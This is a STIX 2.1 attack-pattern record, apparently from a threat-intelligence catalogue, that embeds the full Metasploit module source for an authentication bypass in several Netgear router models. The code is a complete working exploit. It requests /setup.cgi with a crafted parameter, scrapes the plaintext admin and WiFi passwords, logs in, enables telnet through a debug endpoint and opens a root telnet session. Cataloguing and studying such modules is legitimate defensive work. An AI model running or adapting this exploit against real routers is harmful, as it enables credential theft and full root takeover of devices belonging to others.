{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--76302145-c482-4608-964b-7ede09019bbe",
    "created": "2024-08-14T16:23:48.286663Z",
    "modified": "2024-08-14T16:23:48.286669Z",
    "name": "Netgear PNPX_GetShareFolderList Authentication Bypass",
    "description": " This module targets an authentication bypass vulnerability in the mini_http binary of several Netgear Routers running firmware versions prior to 1.2.0.88, 1.0.1.80, 1.1.0.110, and 1.1.0.84. The vulnerability allows unauthenticated attackers to reveal the password for the admin user that is used to log into the router's administrative portal, in plaintext.  Once the password has been been obtained, the exploit enables telnet on the target router and then utiltizes the auxiliary/scanner/telnet/telnet_login module to log into the router using the stolen credentials of the admin user. This will result in the attacker obtaining a new telnet session as the \"root\" user.  This vulnerability was discovered and exploited by an independent security researcher who reported it to SSD.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass.rb",
            "external_id": "netgear_pnpx_getsharefolderlist_auth_bypass.rb"
        },
        {
            "source_name": "reference",
            "url": "https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133"
        },
        {
            "source_name": "reference",
            "url": "https://ssd-disclosure.com/ssd-advisory-netgear-d7000-authentication-bypass/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Netgear PNPX_GetShareFolderList Authentication Bypass',\n        'Description' => %q{\n          This module targets an authentication bypass vulnerability in the mini_http binary of several Netgear Routers\n          running firmware versions prior to 1.2.0.88, 1.0.1.80, 1.1.0.110, and 1.1.0.84. The vulnerability allows\n          unauthenticated attackers to reveal the password for the admin user that is used to log into the\n          router's administrative portal, in plaintext.\n\n          Once the password has been been obtained, the exploit enables telnet on the target router and then utiltizes\n          the auxiliary/scanner/telnet/telnet_login module to log into the router using the stolen credentials of the\n          admin user. This will result in the attacker obtaining a new telnet session as the \"root\" user.\n\n          This vulnerability was discovered and exploited by an independent security researcher who reported it to SSD.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Unknown', # Vulnerability discovery and PoC creation.\n          'Grant Willcox' # Metasploit Module\n        ],\n        'References' => [\n          [ 'URL', 'https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133' ],\n          [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-netgear-d7000-authentication-bypass/' ]\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS],\n          'RelatedModules' => [ 'exploit/linux/telnet/netgear_telnetenable' ], # This module relies on users also running exploit/linux/telnet/netgear_telnetenable to get the shell.\n        },\n        'DisclosureDate' => '2021-09-06',\n        'DefaultTarget' => 0\n      )\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => '/top.html',\n      'method' => 'GET'\n    )\n\n    if res.nil?\n      return Exploit::CheckCode::Unknown('Connection timed out.')\n    end\n\n    unless res.headers['WWW-Authenticate'] =~ /netgear/i\n      return Exploit::CheckCode::Safe('Target does not appear to be a Netgear router!')\n    end\n\n    # Retrieve model name and firmware version\n    res = send_request_cgi({ 'uri' => '/currentsetting.htm' })\n    if res.nil?\n      return Exploit::CheckCode::Unknown('Connection timed out.')\n    end\n\n    data = res.to_s\n    firmware_version = data.match(/^Firmware=V(\\d+\\.\\d+\\.\\d+\\.\\d+)_(\\d+\\.\\d+\\.\\d+)/)\n    if firmware_version.nil?\n      return Exploit::CheckCode::Unknown('Could not retrieve firmware version!')\n    end\n\n    major_version = firmware_version[1]\n    minor_version = firmware_version[2]\n\n    model_name = data.match(/Model=([a-zA-Z0-9]+)/)\n    if model_name.nil?\n      return Exploit::CheckCode::Unknown('Could not retrieve model of the router!')\n    end\n\n    model_name = model_name[1]\n\n    # Check model is actually vulnerable\n    vulnerable_router_models = ['AC2100', 'AC2400', 'AC2600', 'D7000', 'R6220', 'R6230', 'R6260', 'R6330', 'R6350', 'R6700v2', 'R6800', 'R6850', 'R6900v2', 'R7200', 'R7350', 'R7400', 'R7450']\n    unless vulnerable_router_models.include?(model_name)\n      return Exploit::CheckCode::Safe('Not a vulnerable router model!')\n    end\n\n    # Check version is vulnerable\n    print_status(\"Target is a #{model_name} router running firmware version #{major_version}_#{minor_version}\")\n    if (Rex::Version.new(major_version) >= Rex::Version.new('1.2.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.2.0.88'))\n      return Exploit::CheckCode::Appears\n    elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.0.1.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.0.1.80'))\n      return Exploit::CheckCode::Appears\n    elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.1.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.1.0.110')) # Need more work on this as this isn't a good check for affected versions and may overlap with patched versions.\n      return Exploit::CheckCode::Appears\n    elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.1.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.1.0.84')) # Need more work on this to make sure we apply this to the correct systems.\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe('Not a vulnerable router version!')\n    end\n  end\n\n  def run\n    print_status('Attempting to leak the password of the admin user...')\n    res = send_request_cgi(\n      'uri' => '/setup.cgi',\n      'method' => 'GET',\n      'vars_get' => {\n        'next_file' => 'BRS_swisscom_success.html',\n        'x' => 'todo=PNPX_GetShareFolderList'\n      }\n    )\n\n    html_response = res.get_html_document\n    leaked_info_array = []\n    html_response.xpath('//div[@id=\"passpharse\"]/following-sibling::div[@class=\"right_div\"]').map { |node| leaked_info_array << node.text }\n    unless leaked_info_array.include?('admin')\n      fail_with(Failure::UnexpectedReply, 'Application did not respond with the expected admin username in its response!')\n    end\n    wifi_password = leaked_info_array[0]\n    wifi_password_5g = leaked_info_array[1]\n    username = leaked_info_array[2]\n    password = leaked_info_array[3]\n\n    network_names = html_response.xpath('//div[@id=\"network_name\"]/following-sibling::div[@class=\"right_div\"]')\n    if network_names.length < 2\n      print_warning('Application did not respond with an SSID in its response!')\n    else\n      wifi_ssid = network_names[1].text\n    end\n\n    network_names_5g = html_response.xpath('//div[@id=\"network_name_5G\"]/following-sibling::div/child::text()')\n    if network_names_5g.empty?\n      print_warning('Application did not respond with an 5G SSID in its response!')\n    else\n      wifi_ssid_5g = network_names_5g.text\n    end\n\n    if wifi_ssid_5g.empty? || wifi_password_5g.empty?\n      print_warning('5G SSID information contained blank strings, skipping saving this info to the database!')\n    else\n      # Create 5G WiFi credential\n      wifi_data_5g = {\n        origin_type: :import,\n        address: datastore['RHOST'],\n        module_fullname: fullname,\n        workspace_id: myworkspace_id,\n        filename: \"wifi_#{wifi_ssid_5g}_creds.txt\",\n        username: wifi_ssid_5g,\n        private_data: wifi_password_5g,\n        private_type: :password\n      }\n      create_credential(wifi_data_5g)\n    end\n\n    if wifi_ssid.empty? || wifi_password.empty?\n      print_warning('SSID information contained blank strings, skipping saving this info to the database!')\n    else\n      # Create regular WiFi credential\n      wifi_data = {\n        origin_type: :import,\n        address: datastore['RHOST'],\n        module_fullname: fullname,\n        workspace_id: myworkspace_id,\n        filename: \"wifi_#{wifi_ssid}_creds.txt\",\n        username: wifi_ssid,\n        private_data: wifi_password,\n        private_type: :password\n      }\n      create_credential(wifi_data)\n    end\n\n    if username.empty? || password.empty?\n      fail_with(Failure::UnexpectedReply, 'Application responded with expected content, but the matched content was an empty string for some reason!')\n    end\n\n    print_good(\"Can log into target router using username #{username} and password #{password}\")\n\n    print_status('Attempting to retrieve /top.html to verify we are logged in!')\n\n    print_status('Sending one request to grab authorization cookie from headers...')\n    cookie_jar.clear\n    res = send_request_cgi(\n      'uri' => '/top.html',\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')\n    end\n\n    if cookie_jar.empty?\n      fail_with(Failure::UnexpectedReply, \"Router didn't respond with the expected Set-Cookie header to a response to /top.html!\")\n    end\n\n    print_status('Got the authentication cookie, associating it with a logged in session...')\n    res = send_request_cgi(\n      'uri' => '/top.html',\n      'method' => 'GET',\n      'authorization' => basic_auth(username, password)\n    )\n\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')\n    end\n\n    result = res.get_html_document\n    if result.xpath(\"//div[@id='firm_version']/text()\").empty? # Find all div tags with an \"id\" attribute named \"firm_version\" and find its text value.\n      fail_with(Failure::UnexpectedReply, 'The target router did not respond with a firmware version when /top.html was requested. Are we logged in?')\n    end\n\n    print_good('Successfully logged into target router using the stolen credentials!')\n    print_status('Attempting to store the stolen admin credentials for future use...')\n\n    # Create HTTP Login Data\n    store_valid_credential(user: username, private: password, private_type: :password)\n\n    print_status('Enabling telnet on the target router...')\n    res = send_request_cgi(\n      'uri' => '/setup.cgi',\n      'method' => 'GET',\n      'vars_get' => {\n        'todo' => 'debug'\n      },\n      'authorization' => basic_auth(username, password)\n    )\n\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')\n    end\n\n    unless res.body.include?('Debug Enable!')\n      fail_with(Failure::UnexpectedReply, 'Target did not enable debug mode for some reason!')\n    end\n    print_good('Telnet enabled on target router!')\n    handler = framework.modules.create('auxiliary/scanner/telnet/telnet_login')\n    handler.datastore['RHOSTS'] = datastore['RHOST']\n    File.delete('netgear_pnpx_wordlist.txt') if File.exist?('netgear_pnpx_wordlist.txt') # Make sure the file is deleted if it already exists.\n    file_handle = File.open('netgear_pnpx_wordlist.txt', 'wb')\n    file_handle.write(\"#{username} #{password}\")\n    file_handle.close\n    handler.datastore['USERPASS_FILE'] = 'netgear_pnpx_wordlist.txt'\n    print_status(\"Attempting to log in with #{username}:#{password}. You should get a new telnet session as the root user\")\n    handler.run\n    File.delete('netgear_pnpx_wordlist.txt') if File.exist?('netgear_pnpx_wordlist.txt') # Remove the file once we are done.\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-09-06"
}